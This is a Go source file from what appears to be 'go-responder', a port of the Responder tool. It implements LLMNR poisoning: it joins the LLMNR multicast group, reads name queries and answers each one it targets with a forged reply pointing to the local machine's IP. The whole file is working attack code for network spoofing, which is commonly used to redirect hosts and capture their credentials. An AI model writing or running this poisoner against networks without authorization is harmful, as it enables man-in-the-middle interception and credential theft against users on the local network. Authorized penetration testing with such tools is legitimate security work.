package poisoner

import (
	"encoding/binary"
	"fmt"
	"net"

	"go-responder/internal/core"
)

const llmnrMulticast = "224.0.0.252"
const llmnrPort = 5355

func PoisonLLMNR(ifaceIP net.IP) {
	iface, err := IfaceByIP(ifaceIP)
	if err != nil {
		core.LogError("LLMNR ifaceByIP: %v", err)
		return
	}
	group := &net.UDPAddr{IP: net.ParseIP(llmnrMulticast), Port: llmnrPort}
	conn, err := net.ListenMulticastUDP("udp4", iface, group)
	if err != nil {
		core.LogError("LLMNR multicast listen - %v (need root?)", err)
		return
	}
	defer conn.Close()
	core.LogInfo("LLMNR listening on %s (UDP %d, multicast %s)", ifaceIP, llmnrPort, llmnrMulticast)

	buf := make([]byte, 512)
	for {
		n, src, err := conn.ReadFromUDP(buf)
		if err != nil {
			continue
		}
		pkt := buf[:n]
		name := ParseLLMNRQuery(pkt)
		if name == "" {
			continue
		}
		core.LogVerbose("LLMNR query: %s from %s", name, src)
		if core.AnalyzeMode {
			core.LogInfo("[LLMNR] [Analyze] query for '%s' from %s", name, src)
			continue
		}
		if !core.ShouldRespond(src, name) {
			continue
		}
		resp := BuildLLMNRResponse(pkt, ifaceIP)
		if resp != nil {
			conn.WriteTo(resp, src)
			core.LogInfo("[LLMNR] Poisoned query for '%s' - responding with %s", name, ifaceIP)
		}
	}
}

func ParseLLMNRQuery(pkt []byte) string {
	if len(pkt) < 12 {
		return ""
	}
	flags := binary.BigEndian.Uint16(pkt[2:4])
	if flags&0x8000 != 0 {
		return ""
	}
	if binary.BigEndian.Uint16(pkt[4:6]) == 0 {
		return ""
	}
	return DecodeDNSName(pkt, 12)
}

func DecodeDNSName(pkt []byte, off int) string {
	var name []byte
	for off < len(pkt) {
		l := int(pkt[off])
		if l == 0 {
			break
		}
		off++
		if off+l > len(pkt) {
			break
		}
		if len(name) > 0 {
			name = append(name, '.')
		}
		name = append(name, pkt[off:off+l]...)
		off += l
	}
	return string(name)
}

func BuildLLMNRResponse(query []byte, ip net.IP) []byte {
	if len(query) < 12 {
		return nil
	}
	txID := query[0:2]
	qStart := 12
	qEnd := qStart
	for qEnd < len(query) {
		l := int(query[qEnd])
		qEnd++
		if l == 0 {
			break
		}
		qEnd += l
	}
	if qEnd+4 > len(query) {
		return nil
	}
	qType := binary.BigEndian.Uint16(query[qEnd : qEnd+2])
	if qType != 1 && qType != 255 {
		return nil
	}
	qEnd += 4
	question := query[qStart:qEnd]

	var resp []byte
	resp = append(resp, txID...)
	resp = append(resp, 0x80, 0x00)
	resp = append(resp, 0x00, 0x01)
	resp = append(resp, 0x00, 0x01)
	resp = append(resp, 0x00, 0x00)
	resp = append(resp, 0x00, 0x00)
	resp = append(resp, question...)
	resp = append(resp, 0xC0, 0x0C)
	resp = append(resp, 0x00, 0x01)
	resp = append(resp, 0x00, 0x01)
	resp = append(resp, 0x00, 0x00, 0x00, 0x1E)
	resp = append(resp, 0x00, 0x04)
	resp = append(resp, ip.To4()...)
	return resp
}

func IfaceByIP(ip net.IP) (*net.Interface, error) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil, err
	}
	for i := range ifaces {
		addrs, _ := ifaces[i].Addrs()
		for _, a := range addrs {
			var ifIP net.IP
			switch v := a.(type) {
			case *net.IPNet:
				ifIP = v.IP
			case *net.IPAddr:
				ifIP = v.IP
			}
			if ifIP != nil && ifIP.Equal(ip) {
				return &ifaces[i], nil
			}
		}
	}
	return nil, fmt.Errorf("no interface with IP %s", ip)
}
